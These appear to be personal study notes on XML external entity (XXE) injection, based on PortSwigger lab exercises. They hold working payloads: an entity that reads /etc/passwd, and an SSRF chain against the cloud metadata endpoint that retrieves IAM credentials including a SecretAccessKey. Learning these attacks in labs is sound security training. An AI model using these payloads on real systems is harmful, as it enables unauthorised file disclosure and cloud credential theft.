[[Portswigger]]
https://portswigger.net/web-security/xxe
(read this)
it is vulnerability  that let the attacker to interfere with application's processing XML , and sometimes allows the attacker to view server's system files  , and it can use to perform SSRF

and it can be arise because it use xml to transmit data between browser and the server and xml it self have a lot of potentially dangerous features

There are various types of XXE attacks:

- [Exploiting XXE to retrieve files](https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files), where an external entity is defined containing the contents of a file, and returned in the application's response.
- [Exploiting XXE to perform SSRF attacks](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks), where an external entity is defined based on a URL to a back-end system.
- [Exploiting blind XXE exfiltrate data out-of-band](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band), where sensitive data is transmitted from the application server to a system that the attacker controls.
- [Exploiting blind XXE to retrieve data via error messages](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages), where the attacker can trigger a parsing error message containing sensitive data.

let's start with the labs and how we can use it : 
## first lab
in this this lab there's check product and it use XML to transmit data we can use it and make it transmit some files from  the server's system files , we can use this inject this code   `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>`  in xml  to retrieve the file /etc/passwd and you can check for the most useful files here [[File Inclusion]] in Path Traversal section , anyway after the injection it will be like this ``

`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>`

## second lab

in this lab we exploit XXE vulnerability to perform SSRF
and to do this use this command 
`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>`
then The response should contain "Invalid product ID:" followed by the response from the metadata endpoint, which will initially be a folder name. then you should add the name of the file , so if the folder name was `latest` you just edit this and it will be 
`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]>`
and continue like this until it be like this 
`/latest/meta-data/iam/security-credentials/admin`
 
This should return JSON containing the `SecretAccessKey`.


there's more labs you should complete

## the end
### How to find and test for XXE vulnerabilities

The vast majority of XXE vulnerabilities can be found quickly and reliably using Burp Suite's web vulnerability scanner.

Manually testing for XXE vulnerabilities generally involves:

- Testing for [file retrieval](https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files) by defining an external entity based on a well-known operating system file and using that entity in data that is returned in the application's response.
- Testing for [blind XXE vulnerabilities](https://portswigger.net/web-security/xxe/blind) by defining an external entity based on a URL to a system that you control, and monitoring for interactions with that system. [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) is perfect for this purpose.
- Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document by using an [XInclude attack](https://portswigger.net/web-security/xxe#xinclude-attacks) to try to retrieve a well-known operating system file.
